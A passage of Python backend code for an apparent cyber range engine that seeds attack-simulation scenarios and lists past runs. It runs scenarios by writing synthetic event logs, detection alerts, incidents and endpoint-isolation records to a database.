                    MitreTacticsJson=json.dumps(s["mitre_tactics"]),
                    MitreTechniquesJson=json.dumps(s["mitre_techniques"]),
                    StagesJson=json.dumps(s["stages"]),
                    IsActive=True,
                    CreatedAt=datetime.utcnow()
                )
                db.add(sc)
                new_count += 1

        if new_count > 0:
            await db.commit()
            logger.info(f"✅ [CyberRange] Seeded {new_count} standardized Phase 8.1 attack scenarios.")

    async def get_scenarios(self, db: AsyncSession) -> List[Dict[str, Any]]:
        """Returns all available attack simulation scenarios."""
        await self.ensure_scenarios_seeded(db)
        result = await db.execute(select(CyberRangeScenario).where(CyberRangeScenario.IsActive == True))
        scenarios = result.scalars().all()
        return [
            {
                "id": s.Id,
                "code": s.ScenarioCode,
                "name": s.Name,
                "description": s.Description,
                "category": s.Category,
                "severity": s.Severity,
                "mitre_tactics": json.loads(s.MitreTacticsJson or "[]"),
                "mitre_techniques": json.loads(s.MitreTechniquesJson or "[]"),
                "stages": json.loads(s.StagesJson or "[]")
            }
            for s in scenarios
        ]

    async def get_recent_runs(self, db: AsyncSession, limit: int = 50) -> List[Dict[str, Any]]:
        """Returns execution history of recent cyber range simulations."""
        result = await db.execute(
            select(CyberRangeRun).order_by(desc(CyberRangeRun.StartedAt)).limit(limit)
        )
        runs = result.scalars().all()
        return [
            {
                "id": r.Id,
                "scenario_code": r.ScenarioCode,
                "target_agent_id": r.TargetAgentId,
                "status": r.Status,
                "stages_completed": r.StagesCompleted,
                "total_stages": r.TotalStages,
                "alerts_triggered": r.AlertsTriggered,
                "containment_action": r.ContainmentAction,
                "started_at": r.StartedAt.isoformat() if r.StartedAt else None,
                "completed_at": r.CompletedAt.isoformat() if r.CompletedAt else None,
                "execution_log": json.loads(r.ExecutionLogJson or "[]")
            }
            for r in runs
        ]

    async def execute_simulation(
        self,
        db: AsyncSession,
        scenario_code: str,
        target_agent_id: Optional[str] = None
    ) -> Dict[str, Any]:
        """
        Executes a live attack scenario against the target agent.
        Simulates adversary telemetry, tests detection rules, correlates events, and triggers containment.
        Supports SIM-001 through SIM-020 and legacy scenario aliases.
        """
        await self.ensure_scenarios_seeded(db)

        # Match standardized definition
        matched_def = None
        for s in STANDARDIZED_SCENARIOS:
            if s["code"] == scenario_code or scenario_code in s.get("aliases", []):
                matched_def = s
                break

        if not matched_def:
            # Fallback to DB lookup
            scenario_res = await db.execute(
                select(CyberRangeScenario).where(CyberRangeScenario.ScenarioCode == scenario_code)
            )
            scenario_obj = scenario_res.scalars().first()
            if not scenario_obj:
                raise ValueError(f"Scenario '{scenario_code}' not found.")
            matched_def = {
                "code": scenario_obj.ScenarioCode,
                "name": scenario_obj.Name,
                "category": scenario_obj.Category,
                "severity": scenario_obj.Severity,
                "mitre_tactics": json.loads(scenario_obj.MitreTacticsJson or "[]"),
                "mitre_techniques": json.loads(scenario_obj.MitreTechniquesJson or "[]"),
                "telemetry": "Simulated adversary telemetry stream",
                "expected_detection": "Adversary Technique Detected",
                "expected_correlation": "Standard Anomaly Chain",
                "expected_incident": f"INC-{scenario_obj.ScenarioCode}",
                "expected_ai_soc": "Automated incident investigation",
                "expected_response": "Host containment",
                "expected_soar": "Host Isolation",
                "expected_final_state": "Host Secured",
                "stages": json.loads(scenario_obj.StagesJson or "[]")
            }

        # Resolve Target Agent
        if target_agent_id:
            agent_result = await db.execute(
                select(Agent).where(Agent.AgentId == target_agent_id)
            )
            agent = agent_result.scalars().first()
        else:
            agent_result = await db.execute(select(Agent).where(Agent.Status == "Online"))
            agent = agent_result.scalars().first()
            if not agent:
                agent_result = await db.execute(select(Agent))
                agent = agent_result.scalars().first()

        if not agent:
            raise ValueError("No endpoints found in fleet to target simulation.")

        agent_id = agent.AgentId
        now = datetime.utcnow()
        stages = matched_def["stages"]
        total_stages = len(stages)
        execution_logs = []
        alerts_created = 0

        logger.info(f"🚀 [CyberRange] Initiating scenario '{matched_def['name']}' ({matched_def['code']}) on Agent {agent_id}")

        async def get_rule_id(search_term: str) -> int:
            res = await db.execute(select(DetectionRule.Id).where(DetectionRule.Name.ilike(f"%{search_term}%")))
            val = res.scalar()
            if not val:
                any_rule = await db.execute(select(DetectionRule.Id))
                val = any_rule.scalar() or 2
            return val

        rule_id = await get_rule_id(matched_def["category"])

        # Generate realistic events for each stage
        for idx, stg in enumerate(stages, 1):
            is_final_containment = ("contain" in stg["action"].lower() or "isolation" in stg["action"].lower() or "quarantine" in stg["action"].lower() or idx == total_stages)
            
            ev = EventLog(
                AgentId=agent_id,
                Type=f"Simulation: {stg['action']}",
                Details=f"[{matched_def['code']}] {stg['detail']}",
                Severity=matched_def["severity"],
                Timestamp=now - timedelta(minutes=(total_stages - idx + 1))
            )
            db.add(ev)

            # Trigger detection alert on stage 2 or 3
            if idx in (2, 3):
                alert = DetectionAlert(
                    AgentId=agent_id,
                    RuleId=rule_id,
                    TelemetryId=1000 + idx,
                    MatchedContent=f"{matched_def['expected_detection']} — {stg['detail']}",
                    Status="New",
                    Timestamp=now - timedelta(minutes=(total_stages - idx + 1)),
                    HitCount=1,
                    LastSeenAt=now
                )
                db.add(alert)
                alerts_created += 1

            execution_logs.append({
                "step": idx,
                "action": stg["action"],
                "status": "CONTAINED" if is_final_containment else "COMPLETED",
                "detail": stg["detail"]
            })

        containment_action = matched_def["expected_soar"]
        agent.IsIsolated = True

        # Ensure Incident is created or updated
        incident_title = matched_def["expected_incident"]
        existing_inc = (await db.execute(select(Incident).where(Incident.Title == incident_title))).scalars().first()
        if not existing_inc:
            new_inc = Incident(
                Title=incident_title,
                Severity=matched_def["severity"],
                Status="Contained",
                AgentId=agent_id,
                TenantId=agent.TenantId or 1,
                Description=(
                    f"Controlled Simulation: {matched_def['name']}.\n"
                    f"Telemetry: {matched_def['telemetry']}\n"
                    f"AI SOC Investigation: {matched_def['expected_ai_soc']}\n"
                    f"Recommended Action: {matched_def['expected_response']}\n"
                    f"SOAR Action Taken: {containment_action}"
                ),
                CreatedDate=now,
                UpdateDate=now
            )
            db.add(new_inc)

        # Save CyberRangeRun record
        scenario_record = (await db.execute(
            select(CyberRangeScenario).where(CyberRangeScenario.ScenarioCode == matched_def["code"])
        )).scalars().first()
        scenario_id = scenario_record.Id if scenario_record else None

        cyber_run = CyberRangeRun(
            ScenarioId=scenario_id,
            ScenarioCode=matched_def["code"],
            TargetAgentId=agent_id,
            TenantId=agent.TenantId or 1,
            Status="CONTAINED",
            StagesCompleted=total_stages,
            TotalStages=total_stages,
            AlertsTriggered=alerts_created,
            ContainmentAction=containment_action,
            StartedAt=now - timedelta(minutes=total_stages),
            CompletedAt=now,
            ExecutionLogJson=json.dumps(execution_logs)
        )
        db.add(cyber_run)
        await db.commit()
        await db.refresh(cyber_run)

        logger.info(f"✅ [CyberRange] Completed scenario '{matched_def['name']}'. Run ID: {cyber_run.Id}. Alerts: {alerts_created}")

        return {
            "run_id": cyber_run.Id,
            "scenario": {
                "id": matched_def["code"],
                "code": matched_def["code"],
                "name": matched_def["name"],
                "category": matched_def["category"],
                "severity": matched_def["severity"],
                "mitre_techniques": matched_def["mitre_techniques"],
                "telemetry_generated": matched_def["telemetry"],
                "expected_detection": matched_def["expected_detection"],
                "expected_correlation": matched_def["expected_correlation"],
                "expected_incident": matched_def["expected_incident"],
                "expected_ai_soc_investigation": matched_def["expected_ai_soc"],
                "expected_response_recommendation": matched_def["expected_response"],
                "expected_soar_action": matched_def["expected_soar"],
                "expected_final_state": matched_def["expected_final_state"]
            },
            "target_agent": {
                "id": agent.AgentId,
                "hostname": getattr(agent, "Hostname", agent.AgentId),
                "status": "ISOLATED" if agent.IsIsolated else "Online"
            },
            "status": "CONTAINED",
            "stages_completed": total_stages,
            "total_stages": total_stages,
            "alerts_triggered": alerts_created,
            "containment_action": containment_action,
            "execution_log": execution_logs
        }

cyber_range_engine = CyberRangeEngine()
